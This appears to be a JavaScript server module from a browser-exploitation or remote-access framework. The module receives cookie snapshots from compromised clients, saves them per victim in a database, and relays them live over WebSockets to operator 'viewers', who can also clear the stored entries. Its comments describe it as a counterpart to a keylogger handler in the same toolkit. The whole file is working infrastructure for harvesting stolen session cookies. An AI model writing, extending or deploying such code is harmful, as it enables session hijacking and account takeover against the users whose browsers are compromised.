/**
 * Server-side cookies payload handler.
 * Receives cookie snapshots from the client, persists them to DB,
 * and relays them to connected viewers.
 *
 * Follows the same DB-backed pattern as the keylogger handler:
 * - `cookies` is a DB-backed getter so it always reflects persisted state.
 * - Viewers receive `init` (all entries on connect) and incremental `cookies` messages.
 * - Viewers can send `{ type: "clear" }` to wipe all entries.
 */
import { broadcast } from "../ws-utils.js";

/**
 * Initialize per-client cookies handler state.
 * @param {object} db - The database layer (from db.js)
 * @param {string} clientId - The client's UUID
 * @param {Function} [storeLog] - Optional storeLog for DB-persisted log entries
 * @returns {object} Handler state
 */
export function initState(db, clientId, storeLog = () => {}) {
  const state = {
    viewers: new Set(),
    clientId,
    db,
    storeLog,
  };
  // Expose cookies as a DB-backed getter — always reflects persisted data
  Object.defineProperty(state, "cookies", {
    get() {
      return db.getCookieEntries(clientId);
    },
    enumerable: true,
  });
  return state;
}

/**
 * Handle incoming messages from the client.
 * Expects `{ type: "cookies", cookies: [...] }` with cookie change data.
 * @param {object} state - Per-client handler state from initState()
 * @param {object} data - Parsed message from the client
 * @param {Function} _pushToViewers - Unused (incremental push handled inline)
 */
export function onMessage(state, data, _pushToViewers) {
  if (data.type === "cookies") {
    const cookies = Array.isArray(data.cookies) ? data.cookies : [];
    if (cookies.length === 0) return;

    for (const cookie of cookies) {
      state.db.insertCookieEntry(
        state.clientId,
        cookie.name || "",
        cookie.value ?? null,
        cookie.removed || false,
        cookie.timestamp || Date.now()
      );
    }

    // Forward the new cookie changes as-received to any connected viewers
    if (state.viewers.size > 0) {
      broadcast(state.viewers, JSON.stringify({ type: "cookies", cookies }));
    }
  }
}

/**
 * Called when a viewer WebSocket connects.
 * Sends all persisted entries as `init`, and listens for `clear` commands.
 * @param {object} state - Per-client handler state from initState()
 * @param {import("ws").WebSocket} ws - The viewer WebSocket
 */
export function onViewerConnect(state, ws) {
  state.viewers.add(ws);
  ws.send(JSON.stringify({ type: "init", cookies: state.cookies }));

  ws.on("message", (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch {
      return;
    }
    if (msg.type === "clear") {
      state.db.clearCookieEntries(state.clientId);
      broadcast(state.viewers, JSON.stringify({ type: "cleared" }));
    }
  });

  ws.on("close", () => state.viewers.delete(ws));
}

/**
 * Broadcast all persisted cookies to all connected viewers.
 * @param {object} state - Per-client handler state from initState()
 */
export function pushToAllViewers(state) {
  if (state.viewers.size === 0) return;
  broadcast(state.viewers, JSON.stringify({ type: "cookies", cookies: state.cookies }));
}

/**
 * Called when the client WebSocket closes.
 * Notifies connected viewers that the client stream has ended.
 * @param {object} state - Per-client handler state from initState()
 */
export function onDisconnect(state) {
  if (state.viewers.size === 0) return;
  broadcast(state.viewers, JSON.stringify({ type: "disconnected" }));
}
